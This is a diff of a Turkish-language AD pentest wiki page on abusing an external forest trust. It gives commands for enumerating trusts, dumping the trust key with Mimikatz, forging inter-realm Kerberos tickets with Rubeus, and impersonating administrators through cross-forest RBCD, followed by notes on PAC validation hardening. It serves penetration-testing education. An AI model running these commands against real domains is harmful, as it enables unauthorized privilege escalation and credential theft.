@@ -1,12 +1,12 @@
-# Dış Orman Alanı - Tek Yönlü (Giriş) veya iki yönlü
+# Harici Orman Etki Alanı - Tek Yön (Gelen) veya çift yönlü
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Bu senaryoda, bir dış alan size güveniyor (veya her ikisi de birbirine güveniyor), bu nedenle üzerinde bir tür erişim elde edebilirsiniz.
+Bu senaryoda harici bir etki alanı size güveniyor (veya her ikisi birbirine güveniyor), bu yüzden onun üzerinde bir tür erişim elde edebilirsiniz.
 
-## Sayım
+## Keşif
 
-Öncelikle, **güveni** **saymalısınız**:
+Her şeyden önce, **güven ilişkisini** **keşfetmeniz** gerekiyor:
 ```bash
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
@@ -55,14 +55,19 @@ IsDomain     : True
 
 # You may also enumerate where foreign groups and/or users have been assigned
 # local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
+
+# Additional trust hygiene checks (AD RSAT / AD module)
+Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
 ```
-Önceki sayımda, **`crossuser`** kullanıcısının **dış alan** içindeki **DC**'de **Admin erişimi** olan **`External Admins`** grubunun içinde olduğu bulundu.
+> `SelectiveAuthentication`/`SIDFiltering*` ile ekstra önkoşullar olmadan cross-forest istismar yollarının (RBCD, SIDHistory) muhtemelen çalışıp çalışmayacağını hızlıca görebilirsiniz.
+
+Önceki taramada, kullanıcı **`crossuser`**'ın **`External Admins`** grubunun içinde olduğu ve bu grubun **harici domainin DC**'si içinde **Admin access**'e sahip olduğu tespit edildi.
 
 ## İlk Erişim
 
-Eğer diğer alandaki kullanıcınızın herhangi bir **özel** erişimini bulamadıysanız, AD Metodolojisine geri dönebilir ve **yetkisiz bir kullanıcıdan privesc** denemeye çalışabilirsiniz (örneğin kerberoasting gibi):
+Eğer diğer domainde kullanıcınızın herhangi bir **special** erişimini bulamadıysanız, yine de AD Methodology'ye geri dönüp **privesc from an unprivileged user** denemeyi (örneğin kerberoasting gibi) deneyebilirsiniz:
 
-**Powerview fonksiyonlarını** kullanarak `-Domain` parametresi ile **diğer alanı** **sayım** yapmak için şu şekilde kullanabilirsiniz:
+**Powerview functions**'u `-Domain` parametresi ile **other domain**'i **enumerate** etmek için kullanabilirsiniz, örneğin:
 ```bash
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
@@ -70,28 +75,28 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ./
 {{#endref}}
 
-## Taklit
+## Kimlik Taklidi
 
 ### Giriş Yapma
 
-Dış domaine erişimi olan kullanıcıların kimlik bilgileriyle normal bir yöntem kullanarak erişim sağlamalısınız:
+Harici etki alanına erişimi olan kullanıcıların kimlik bilgileriyle sıradan bir yöntem kullanarak şu kaynaklara erişebilmeniz gerekir:
 ```bash
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
-### SID Tarihi İstismarı
+### SID History Abuse
 
-Bir orman güveni üzerinden [**SID Tarihi**](sid-history-injection.md) istismar edebilirsiniz.
+Ayrıca [**SID History**](sid-history-injection.md) bir forest trust üzerinden kötüye kullanılabilir.
 
-Bir kullanıcı **bir ormandan diğerine** taşındığında ve **SID Filtrelemesi etkin değilse**, **diğer ormandan bir SID eklemek** mümkün hale gelir ve bu **SID**, **güven üzerinden** kimlik doğrulama sırasında **kullanıcının jetonuna** **eklenecektir**.
+Eğer bir kullanıcı **bir forest'tan diğerine** taşınmışsa ve **SID Filtering etkin değilse**, **diğer forest'tan bir SID eklemek** mümkün hale gelir; bu **SID**, **trust üzerinden** kimlik doğrulaması yaparken kullanıcının **token**'ına **eklenecektir**.
 
 > [!WARNING]
-> Hatırlatmak gerekirse, imza anahtarını şu şekilde alabilirsiniz:
+> Hatırlatma olarak, imzalama anahtarını şu komutla alabilirsiniz
 >
 > ```bash
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
-Mevcut alanın kullanıcısını taklit eden bir **TGT'yi** **güvenilir** anahtarla **imzalayabilirsiniz**.
+Mevcut domain kullanıcısını **taklit eden bir TGT**'yi **güvenilen** anahtarla **imzalayabilirsiniz**.
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
@@ -102,7 +107,7 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-### Kullanıcının Tam Olarak Taklit Edilmesi
+### Kullanıcıyı tamamen taklit etme
 ```bash
 # Get a TGT of the user with cross-domain permissions
 Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap
@@ -116,4 +121,29 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
+### Cross-forest RBCD — trusting forest'ta bir makine hesabını kontrol ettiğinizde (no SID filtering / selective auth)
+
+Eğer yabancı principal (FSP) sizi trusting forest'ta bilgisayar nesneleri üzerinde yazma yetkisine sahip bir gruba yerleştiriyorsa (ör. `Account Operators`, custom provisioning group), o forest'taki bir hedef sunucuda **Resource-Based Constrained Delegation** yapılandırabilir ve oradaki herhangi bir kullanıcıyı taklit edebilirsiniz:
+```bash
+# 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
+# 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
+Set-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount MYLAB$
+# or with PowerView
+Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sidbytes_of_MYLAB}
+
+# 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
+Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
+```
+Bu yalnızca **SelectiveAuthentication devre dışı bırakıldığında** ve **SID filtering** kontrol eden SID'inizi kaldırmadığında çalışır. Bu, SIDHistory forging'den kaçınan hızlı bir lateral yoldur ve genellikle trust incelemelerinde gözden kaçırılır.
+
+### PAC validation hardening
+
+PAC signature validation updates for **CVE-2024-26248**/**CVE-2024-29056** add signing enforcement on inter-forest tickets. In **Compatibility mode**, forged inter-realm PAC/SIDHistory/S4U paths can still work on unpatched DCs. In **Enforcement mode**, unsigned or tampered PAC data crossing a forest trust is rejected unless you also hold the target forest trust key. Registry overrides (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) can weaken this while they remain available.
+
+
+
+## References
+
+- [Microsoft KB5037754 – PAC validation changes for CVE-2024-26248 & CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
+- [MS-PAC spec – SID filtering & claims transformation details](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
 {{#include ../../banners/hacktricks-training.md}}
